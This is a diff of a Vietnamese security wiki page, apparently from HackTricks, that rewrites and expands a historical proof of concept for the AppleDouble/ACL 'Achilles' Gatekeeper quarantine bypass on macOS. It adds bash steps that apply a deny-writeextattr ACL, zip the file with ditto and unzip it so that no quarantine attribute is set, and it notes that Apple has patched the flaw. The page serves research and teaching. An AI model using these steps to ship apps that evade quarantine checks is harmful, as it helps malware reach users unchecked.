@@ -1,12 +1,71 @@
-# macOS xattr-acls: nội dung bổ sung
+# Tái hiện kỹ thuật vượt qua Quarantine bằng AppleDouble ACL
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Proof of concept mang tính lịch sử này tái tạo kỹ thuật AppleDouble/ACL được sử dụng trong nghiên cứu vượt qua Achilles Gatekeeper. Kỹ thuật này serialize một ACL, lưu nó trong sidecar AppleDouble, đổi tên attribute thành `com.apple.acl.text` rồi đóng gói lại ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+Bằng chứng khái niệm mang tính lịch sử này tái tạo kỹ thuật AppleDouble/ACL được sử dụng trong nghiên cứu vượt qua Gatekeeper Achilles. Kỹ thuật này tuần tự hóa một ACL, lưu nó trong một tệp sidecar AppleDouble, đổi tên thuộc tính thành `com.apple.acl.text` rồi đóng gói lại ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple đã vá lỗ hổng vượt qua Gatekeeper này trong macOS Ventura 13, Monterey 12.6.2 và Big Sur 11.7.2; khôi phục ACL trên máy Mac hiện tại không chứng minh rằng có thể vượt qua Gatekeeper.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple đã vá lỗi vượt qua Gatekeeper trong macOS Ventura 13, Monterey 12.6.2 và Big Sur 11.7.2; khôi phục ACL trên máy Mac hiện tại không chứng minh rằng có thể vượt qua Gatekeeper.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-Để tìm hiểu về quarantine và các bước kiểm tra trong lần khởi chạy đầu tiên, xem [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+Để xem các bước kiểm tra quarantine và lần khởi chạy đầu tiên, hãy xem [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## Hành vi của ACL và hệ thống tệp AppleDouble
+
+### writeextattr ACL
+
+ACL này ngăn việc thêm `xattrs` vào tệp
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+Định dạng tệp **AppleDouble** sao chép một tệp cùng với các ACE của nó.
+
+Trong [**mã nguồn**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), có thể thấy biểu diễn ACL dạng văn bản được lưu bên trong xattr có tên **`com.apple.acl.text`** sẽ được đặt làm ACL cho tệp đã giải nén. Vì vậy, nếu bạn nén một ứng dụng vào tệp zip theo định dạng **AppleDouble** với ACL ngăn không cho ghi các xattr khác vào tệp đó... thì xattr quarantine sẽ không được đặt cho ứng dụng:
+
+Xem [**báo cáo gốc**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) để biết thêm thông tin.<sup>[[1]](#references)</sup>
+
+Để tái tạo việc này, trước tiên chúng ta cần lấy chuỗi ACL chính xác:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Lưu ý rằng ngay cả khi cách này hoạt động, sandbox cũng ghi xattr quarantine trước đó.)
+
+## Xây dựng và xác thực sidecar AppleDouble
 
 ```bash
 rm -rf /tmp/test*
@@ -191,7 +250,7 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Microsoft Security Blog — Điểm yếu chí mạng của Gatekeeper: Khám phá một lỗ hổng macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [1] [Microsoft Security Blog — Gót chân Achilles của Gatekeeper: Phát hiện một lỗ hổng macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 - [2] [Apple Developer — Đóng gói phần mềm Mac để phân phối bằng `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 - [3] [Apple Support — Giới thiệu về nội dung bảo mật của macOS Ventura 13](https://support.apple.com/en-ae/102853)
 - [4] [Apple Support — Giới thiệu về nội dung bảo mật của macOS Monterey 12.6.2](https://support.apple.com/en-ae/102806)
